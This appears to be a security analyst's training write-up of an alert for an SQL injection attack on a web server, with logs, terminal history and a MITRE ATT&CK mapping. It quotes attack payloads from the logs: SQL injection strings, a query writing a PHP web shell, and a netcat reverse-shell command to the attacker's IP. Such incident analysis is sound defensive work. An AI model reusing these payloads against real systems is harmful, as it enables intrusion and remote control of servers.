# EventID-89

## Event Summary

| Field | Value |
|------|-------|
| Event ID | 89 |
| Event Time | Apr 18, 2021 – 01:00 PM |
| Rule | SOC142 – Multiple HTTP 500 Response |
| Source Address | 101[.]32[.]223[.]119 |
| Source Hostname | 101[.]32[.]223[.]119 |
| Destination Address | 172[.]16[.]20[.]6 |
| Destination Hostname | SQLServer |
| Username | www-data |
| Device Action | Allowed |
| Request URL | `https://172[.]16[.]20[.]6/userNumber=1 AND (SELECT * FROM Users) = 1` |
| User Agent | Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36 |

## Initial Alert Review

First, I copied down the who (source and destination addresses), what (Rule: SOC142 - Multiple HTTP 500 Response), and when (Apr 18, 2021, 01:00 PM) to get an idea of what I was looking at.
Next, I needed to review the artifacts and determine whether this was a true positive or false positive, as well as establish the appropriate next steps depending on the outcome of that initial assessment.
Once I had the information documented, I ran the source IP through VirusTotal and Hybrid Analysis to see if it had any history of malicious activity. On VirusTotal, 0/91 vendors flagged it as malicious, but it had a community score of -14, which was something worth keeping in mind.

<br/>
<img src="https://i.imgur.com/D2Xz8Rm.png" height="80%" width="80%" alt="VirusTotal result"/>
<br />

On Hybrid Analysis, it came back with a threat score of 50/100, which is not exactly indicative of something harmless.

<br/>
<img src="https://i.imgur.com/DxIHoS8.png" height="80%" width="80%" alt="VirusTotal result"/>
<br />

## Network Log Review

Right away, the requested URL was extremely suspicious:
hxxps://172[.]16[.]20[.]6/userNumber=1 AND (SELECT * FROM Users) = 1
This is clearly indicative of a SQL injection attempt, where SQL statements are inserted into fields or URLs in an effort to access or manipulate underlying data.
Next, I checked Log Management to determine whether the same source address had attempted access before or after this event. The earliest access attempt I found from the suspicious IP was:
hxxps://172[.]16[.]20[.]6/userNumber=' OR '' = '
This is essentially the textbook example of a SQL injection attack.
At this point, I was fairly confident that this was a malicious attempt. What raised additional concern was that some of these requests were returning HTTP 200 responses, indicating successful execution. I pulled the following artifacts from the logs:

|Request URL|Response Code|
|------------|--------------|
https://172[.]16[.]20[.]6/userNumber=' OR '' = '|500
https://172[.]16[.]20[.]6/userNumber=' union select 1, '<?php system($_GET['cmd']); ?>' into outf...| 200
https://172[.]16[.]20[.]6/userNumber=-1 UNION SELECT 1 INTO @,@ |500
https://172[.]16[.]20[.]6/cmd.php?cmd=whoami|200
https://172[.]16[.]20[.]6/userNumber=1 AND (SELECT * FROM Users) = 1|500
https://172[.]16[.]20[.]6/cmd.php?cmd=id|200
https://172[.]16[.]20[.]6/userNumber=AND true|500
https://172[.]16[.]20[.]6/cmd.php?cmd=nc 101[.]32[.]223[.]119 1234 -e /bin/sh|N/A
</br>

## Device Command Line Review

At this point, I was certain this was not a false positive, but I still wanted to determine the overall scope of the compromise.
To prevent further spread, I decided to isolate the affected server from the network and review command history. The most recent request URL initiated a Netcat session that allowed a remote shell to beacon back to the suspicious IP address 101[.]32[.]223[.]119.
I navigated to the Endpoint Security section and contained the 172[.]16[.]20[.]6 (SQLServer) endpoint.
Once the host was contained, I reviewed the terminal history:

</br>

|Time|Command|
|----------|----------|
2021-04-17 17:10 :| pwd
2021-04-17 17:12 :| ls
2021-04-17 18:12 :| mkdir tempDb
2021-04-17 18:54 :| cd tempDb
2021-04-17 18:55 :| git clone https://github.com/postgres/postgres
2021-04-18 09:12 :| apt-get update
2021-04-18 09:13 :| sudo apt-get install wget ca-certificates
2021-04-18 09:14 :| wget --quiet -O - https://www.postgresql.org/media/keys/ACCC4CF8.asc
2021-04-18 09:15 :| sudo apt-get install postgresql postgresql-contrib
2021-04-18 13:01 :| whoami
2021-04-18 13:02 :| id
2021-04-18 13:05 :| nc 101[.]32[.]223[.]119 1234 -e /bin/sh
2021-04-18 15:01 :| apt show postgresql
2021-04-18 15:02 :| sudo apt install postgresql postgresql-contrib

These commands show clear evidence of malicious activity. A temporary directory (tempDb) was created, PostgreSQL was downloaded, and additional dependencies were installed. The Netcat command established a remote shell connection back to the attacker-controlled system, while the PostgreSQL-related commands suggest the attacker may have been preparing to access, manipulate, or exfiltrate database data.
I am confident beyond a shadow of a doubt that this was not a false positive.
Now that I had completed my investigation, I followed the provided playbook. In a real-world environment, I would follow any established incident response playbooks first. However, since this was a training exercise, I wanted to work through the investigation independently to sharpen my skills and gain more hands-on experience.

## Playbook Review

Step 1: Collect Data
Please review the alert details for the following:

Source Address
Destination Address
User Agent

We already gathered this information during the initial review of the alert.
Step 2: Search Logs
Please search Log Management for additional details.
I completed this step earlier to determine whether the malicious IP had generated previous traffic and to better understand the attack timeline.
Step 3: Analyze the URL
Analyze the URL using third-party tools such as:

Any.Run
VirusTotal
URLHaus
URLScan
Hybrid Analysis

I completed this step during the initial investigation.
Finally, the playbook requested any relevant artifacts. I submitted the source IP address:
101[.]32[.]223[.]119
After completing the playbook and submitting my findings, I submitted the case and received confirmation that my analysis was correct.

## MITRE ATT&CK Mapping


|Tactic|Initial Access|
|-----|-----|
|Technique|T1190 - Exploit Public-Facing Application|
|Evidence|SQL injection attempts against the web application using crafted userNumber parameters.|

|Tactic|Execution|
|-----|-----|
|Technique|T1505.003 - Server Software Component: Web Shell|
|Evidence|Attacker uploaded and executed PHP web shell code through SQL injection.|

|Tactic|Discovery|
|-----|-----|
|Technique|T1082 - System Information Discovery|
|Evidence|Execution of whoami and id commands through the web shell.|

|Tactic|Command and Control|
|-----|-----|
|Technique|T1059.004 - Unix Shell|
|Evidence|Shell commands executed from the web shell.|

|Tactic|Command and Control|
|-----|-----|
|Technique|T1095 - Non-Application Layer Protocol|
|Evidence|Netcat was used to establish a remote shell connection.|

|Tactic|Exfiltration|
|-----|-----|
|Technique|T1048 - Exfiltration Over Alternative Protocol|
|Evidence|Potential database access and outbound communication via Netcat.|
